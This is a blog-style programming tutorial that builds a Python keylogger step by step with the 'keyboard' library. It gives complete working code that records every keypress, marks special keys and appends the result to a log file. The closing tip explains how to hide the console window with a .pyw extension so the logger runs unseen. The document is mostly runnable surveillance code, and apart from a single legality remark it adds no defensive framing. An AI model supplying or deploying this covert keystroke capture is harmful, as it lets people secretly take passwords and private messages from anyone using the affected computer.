---
title: Designing A Simple Keylogger In Python
description: A tutorial which teaches you how to develop a simple keylogger in Python. Keyloggers are applications which are used to log keys when typed, naturally, keyloggers are not illegal unless used unlawful purposes
category: Programming
image: https://ik.imagekit.io/kudadam/blog/designing_a_keylogger_in_python/hero.jpg
excerpt: With Python, you can make a keylogger which will log the keypress of the keyboard and save the contents to a file
keywords:
  - keylogger
  - keylogging in python
  - python keylogger
tags:
  - python
date: 2021-04-24
---

> **Keystroke logging**, often referred to as **keylogging** or **keyboard capturing**, is the action of recording (logging) the keys struck on a keyboard, [\[1\]](https://en.wikipedia.org/wiki/Keystroke_logging#cite_note-1) typically covertly, so that a person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program. A **keystroke recorder** or **keylogger** can be either software or [hardware](https://en.wikipedia.org/wiki/Computer_hardware).
>
> ~ [Wikipedia](https://en.wikipedia.org/wiki/Keystroke_logging) ~

<p class="intro">
The above context is extracted from Wikipedia and it explains what a keylogger is and what it does. Well, I hope most of you know what a keylogger is. Keyloggers are in two forms, software and hardware but the one we are going to be creating today is the software form of a keylogger. It is going to listen to all the key strokes and log them to a file. Cool right?
</p>

Before we start, you need to be conversant with the python programming language, it is what we are going to use in this tutorial. Let's get started.

## Installing the required modules

We are going to use the [keyboard](https://pypi.org/project/keyboard/) module for the keylogger. To install it, open your terminal type in `pip install keyboard`. If no error occured, you are good to go.

After that, open a new python file and let's start coding :dark_sunglasses:

## Creating the logger function

```python
import keyboard #The keyboard module

def logger(event):
	print(event.name)

keyboard.on_press(logger)
keyboard.wait()
```

I can say we are done, maybe above 50% done. Let me explain the code; on the first line, we imported the `keyboard` module. Then we defined our `logger(event)` function, it takes `event` as parameter and then it print's it's `.name` out. Then to the next line, we assigned the `logger` function as a parameter to the `keyboard.on_press` method. The `keyboard.on_press` method takes a function as parameter and passes an event to it. Then to the last line, the `keyboard.wait` makes the program run without closing, it acts like a while loop.

If we are to run our code in the terminal, it runs successfully without any errors. However, there is a problem, try typing this sentence after activating the logger `"am a hacker"`.
<img class="Sirv" src="https://ik.imagekit.io/kudadam/blog/designing_a_keylogger_in_python/before_filter.gif" alt="" />

We really might not see the effect because, when the program is ran on the terminal, each character is printed on a new line but if the results were stored in a file, this is how it will look.

<img class="Sirv" src="https://ik.imagekit.io/kudadam/blog/designing_a_keylogger_in_python/before_filter_txt.png" alt="" />

You might be confused, let me explain, when special keys are pressed, their names are returned and thus it makes it difficult for us to know if it was a character or special key. For example, if a user presses <kbd>space</kbd>, it will print out "space" or if <kbd>enter</kbd>, it will print out "enter", when this data is appended to a file, it just adds up to the letters and makes it difficult for us to know whether it was a special key or not.

## Solving the special key problem

Fortunately, there is a solution to this problem, the only thing we need to do is find a way to mark special keys so we will be able to differentiate between the two. To do so, we create another function called `filter(char)` which will filter the results before writing it to a file. It takes a character as parameter and surround the `char` with `[]` if it is a special key else, it will just go ahead and write it to a file.

```python
def filter(char):
	if char == "space":
		return " "
	elif len(char) > 1:
		return "[%s]" % char
	else:
		return char
```

Well, this new code just popped into my head :laughing: , the first time I made the `filter` function, it was like this.

<img class="Sirv" src="https://ik.imagekit.io/kudadam/blog/designing_a_keylogger_in_python/first_filter_function.png" alt="" />

This function above was 98 lines, this was because, I hard-coded every key inside my function, but now, I use a simple logic for the filter function. if we are to look at all the "special keys", we will find out that the length of their name is more than one whereas the length of normal characters or letters is one. So in our new `filter` function, we first checked if the `char == 'space'`, we then return `" "` if true. Then on the next line, we check if the length of the `char` is greater than one, if it is, then it means it is a special key so we wrap `[]`around it. else, we just return the `char`. Now our keylogger logs the characters much better.

```python
import keyboard #The keyboard module

def filter(char):
	if char == "space":
		return " "
	elif len(char) > 1:
		return "[%s]" % char
	else:
		return char

def logger(event):
	print(filter(event.name))

keyboard.on_press(logger)
keyboard.wait()
```

Now, we are 95% done, our keylogger works as expected but it's not logging to any file. It's only writing to stdout. In order to make a real keylogger, we need to log the output to a file.

## Logging data to a file

The final step is to create a function which will write the data to a file.

```python
import keyboard #The keyboard module

def writer(data):
    with open("logs.txt","a") as file:
        file.write(data)

def filter(char):
	if char == "space":
		return " "
	elif len(char) > 1:
		return "[%s]" % char
	else:
		return char

def logger(event):
	writer(filter(event.name))

keyboard.on_press(logger)
keyboard.wait()
```

We created a function called `writer` which takes `data` as parameter, it then writes the data to a file named "logs.txt", the file is going to be located in the directory as the python file.

Let's have a look at our `logger` function again, we called the `writer` function and we passed the `event.name` to it but we wrapped it with the `filter` function to filter it and that's our keylogger. just run your python file and you are good to go

**Tip:** You can hide the console from popping up if you save your python file with a .pyw extension
